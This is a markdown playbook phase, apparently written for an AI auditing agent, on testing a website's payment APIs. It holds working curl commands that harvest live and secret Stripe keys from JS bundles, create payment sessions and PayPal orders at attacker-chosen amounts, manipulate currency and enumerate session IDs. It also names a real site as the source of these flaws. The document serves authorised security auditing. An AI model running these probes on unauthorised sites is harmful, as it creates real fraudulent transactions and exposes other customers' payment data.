---
description: "Phase 7c: Payment API exploitation — unauthenticated payment endpoint probing, price manipulation, and payment infrastructure abuse"
---

# Phase 7c: Payment API Exploitation

**Trigger:** When Phase 1 (recon) or Phase 5 (path enumeration) reveals payment integrations — Stripe, PayPal, Square, Braintree, or any checkout/payment flow. Also trigger when JS bundle analysis reveals payment-related API endpoints.

**Origin:** Discovered during the therealroots.com audit where five unauthenticated payment API endpoints accepted arbitrary amounts, enabling live Stripe checkout sessions for $0.50 and real PayPal orders for 1 cent.

**Ledger:** `Read` the findings ledger from `audits/{domain}/ledger.md` before starting. After this phase completes, `Edit` the ledger to update Phase 7c status, add confirmed findings, chain candidates, and failed techniques.

---

## 7c.1 — Identify Payment Surface

**From earlier phases, look for:**

| Signal | Where to find it | What it means |
|---|---|---|
| `stripe`, `pk_live_`, `pk_test_` | JS bundles, inline scripts | Stripe integration |
| `paypal`, `paypal.com/sdk` | JS bundles, script tags | PayPal integration |
| `sandbox.paypal.com` | JS bundles | PayPal sandbox reference (may indicate test keys in production) |
| `checkout`, `payment`, `billing` | URL paths, form actions | Payment flow |
| `/api/create-payment-intent` | JS bundles (grep for `/api/`) | Stripe server-side endpoint |
| `/api/create-*-order` | JS bundles | Payment order creation |
| `client_secret`, `clientSecret` | JS bundles, network requests | Stripe checkout secrets |
| `CheckoutProvider`, `Elements` | JS bundles (React/Next.js) | Stripe React integration |
| `react-stripe-js` | JS bundles | Stripe React SDK with version |

**JS bundle deep scan for payment endpoints:**
```bash
# Download and scan ALL JS chunks for payment-related API endpoints
for chunk_url in $(curl -s "https://{target}" | grep -oE '/_next/static/chunks/[^"]+\.js' | head -20); do
  content=$(curl -s "https://{target}${chunk_url}")
  endpoints=$(echo "$content" | grep -oiE '"/api/[a-zA-Z0-9_/-]+"' | sort -u)
  secrets=$(echo "$content" | grep -oiE 'pk_live_[a-zA-Z0-9]+|pk_test_[a-zA-Z0-9]+|sk_live_[a-zA-Z0-9]+|sk_test_[a-zA-Z0-9]+' | sort -u)
  if [ -n "$endpoints" ] || [ -n "$secrets" ]; then
    echo "=== $chunk_url ==="
    [ -n "$endpoints" ] && echo "ENDPOINTS: $endpoints"
    [ -n "$secrets" ] && echo "SECRETS: $secrets"
  fi
done
```

**Also grep for payment flow keywords:**
```bash
# In each JS chunk, look for payment logic
grep -oiE '.{0,60}(payment.intent|checkout.session|create.order|capture|amount|price|currency).{0,60}'
```

---

## 7c.2 — Probe Payment Endpoints

For each discovered payment endpoint, test:

### Authentication check
```bash
# Does the endpoint require any authentication?
curl -s -X POST "https://{target}/api/create-payment-intent" \
  -H "Content-Type: application/json" \
  -d '{"email":"audit@test.com","amount":50}'
```

**Critical if:** Returns a success response (2xx) or a payment-provider error (not an auth error). A Stripe error like "amount must be at least $0.50" means the endpoint is live and unauthenticated.

### Amount manipulation
```bash
# Test minimum amount
curl -s -X POST "https://{target}/api/create-payment-intent" \
  -H "Content-Type: application/json" \
  -d '{"email":"audit@test.com","amount":1}'

# Test with explicit low amount
curl -s -X POST "https://{target}/api/create-payment-intent" \
  -H "Content-Type: application/json" \
  -d '{"email":"audit@test.com","amount":50}'

# Test negative amount
curl -s -X POST "https://{target}/api/create-payment-intent" \
  -H "Content-Type: application/json" \
  -d '{"email":"audit@test.com","amount":-100}'

# Test zero
curl -s -X POST "https://{target}/api/create-payment-intent" \
  -H "Content-Type: application/json" \
  -d '{"email":"audit@test.com","amount":0}'
```

**Critical if:** The endpoint creates a payment session with the attacker-specified amount instead of a server-validated price. Check the response for:
- `cs_live_` prefix → LIVE Stripe session (not test mode)
- `cs_test_` prefix → Test mode (less severe but still indicates the vulnerability)
- `client_secret` → The credential to complete checkout
- `checkout_session_id` → Confirms real session creation

### PayPal order creation
```bash
curl -s -X POST "https://{target}/api/create-paypal-order" \
  -H "Content-Type: application/json" \
  -d '{"email":"audit@test.com","amount":1}'
```

**Critical if:** Returns an `orderID` — a real PayPal order was created.

### Currency manipulation
```bash
# Try switching to a weaker currency
curl -s -X POST "https://{target}/api/create-payment-intent" \
  -H "Content-Type: application/json" \
  -d '{"email":"audit@test.com","amount":50,"currency":"jpy"}'
```

---

## 7c.3 — Session Enumeration (IDOR)

If a session status endpoint exists:

```bash
# Test with a fake session ID to confirm the endpoint works
curl -s -X POST "https://{target}/api/check-session-status" \
  -H "Content-Type: application/json" \
  -d '{"sessionId":"cs_live_fake123"}'
```

**Vulnerable if:** Returns a Stripe/PayPal error (not a 404 or auth error) — means it's querying the payment provider directly with user-supplied IDs. Real session IDs could be enumerated to check other customers' payment status.

---

## 7c.4 — Rate Limiting Assessment

Check response headers for rate limit information:
```
x-ratelimit-limit: 1000
x-ratelimit-remaining: 987
x-ratelimit-window: 900000
```

**Assess:** Can an attacker create enough fake sessions to:
- Exhaust Stripe/PayPal rate limits
- Trigger fraud detection on the merchant account
- Pollute transaction/accounting records
- Consume API quota

---

## 7c.5 — Sandbox vs Production Detection

| Signal | Meaning |
|---|---|
| `cs_live_` in response | LIVE Stripe — Critical |
| `cs_test_` in response | Test mode — Medium (still shows vulnerability exists) |
| `pk_live_` in JS bundles | Live publishable key |
| `pk_test_` in JS bundles | Test publishable key (may indicate test mode in production) |
| `sandbox.paypal.com` in JS | PayPal sandbox reference |
| `www.paypal.com/sdk/js` in JS | PayPal live reference |

---

## 7c.6 — Impact Assessment

Rate each finding:

| Scenario | Severity | Condition |
|---|---|---|
| Unauthenticated + client-controlled amount + live mode | **CRITICAL** | Memberships purchasable for pennies |
| Unauthenticated + fixed amount + live mode | **HIGH** | DoS via session flooding |
| Unauthenticated + client-controlled amount + test mode | **HIGH** | Vulnerability exists, just not in prod yet |
| Authenticated + client-controlled amount | **HIGH** | Logged-in users can manipulate prices |
| Session enumeration (IDOR) | **HIGH** | Other users' payment data accessible |
| No rate limiting on payment creation | **MEDIUM** | Session flooding / merchant account abuse |

---

## 7c.7 — Cleanup

**Document all payment objects created during testing:**
- Stripe session IDs (`cs_live_*` or `cs_test_*`)
- PayPal order IDs
- Any other transaction references

These must be listed in the report's "Cleanup Required" section so the site owner can cancel them.

---

## Key Lesson (from therealroots.com audit)

The pattern that makes this exploitable:
1. **JS bundle reveals API endpoint** (`/api/create-payment-intent`)
2. **Endpoint accepts `amount` from client** instead of looking up the price server-side
3. **No authentication** — endpoint is callable by anyone with curl
4. **Live payment provider** — creates real financial transactions

The fix is always the same: **never accept payment amounts from the client. Look up the expected price server-side from the product/survey/membership ID.**
